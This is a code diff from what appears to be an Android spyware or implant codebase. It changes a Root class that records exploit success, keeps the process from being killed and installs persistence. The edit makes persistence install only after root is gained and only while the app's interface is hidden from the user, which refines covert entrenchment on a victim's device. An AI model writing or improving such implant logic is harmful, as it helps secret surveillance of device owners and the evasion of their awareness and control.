@@ -802,7 +802,8 @@ public class Root {
 
 
 	public static void installPersistence() {
-		if (Cfg.PERSISTENCE) {
+		boolean visibility = Status.isGuiVisible();
+		if (Cfg.PERSISTENCE && Status.haveRoot() && Status.getPersistencyStatus() == Status.PERSISTENCY_STATUS_TO_INSTALL && !visibility) {
 			Root.installPersistence(false);
 		}
 	}
@@ -821,9 +822,7 @@ public class Root {
 				if (PackageInfo.checkRoot()) {
 					Status.setExploitResult(Status.EXPLOIT_RESULT_SUCCEED);
 					Status.setRoot(true);
-					if (Cfg.PERSISTENCE && !RunningProcesses.self().isGuiVisible()) {
-						Root.installPersistence(false);
-					}
+					installPersistence();
 					Status.self().setReload();
 				} else {
 					Status.setExploitResult(Status.EXPLOIT_RESULT_FAIL);
@@ -998,9 +997,7 @@ public class Root {
 				}
 				// Avoid having the process killed for using too many resources
 				Root.adjustOom();
-				if (Cfg.PERSISTENCE && !!RunningProcesses.self().isGuiVisible()) {
-					Root.installPersistence(false);
-				}
+				installPersistence();
 
 			} else {
 				Configuration.shellFile = Configuration.shellFileBase;
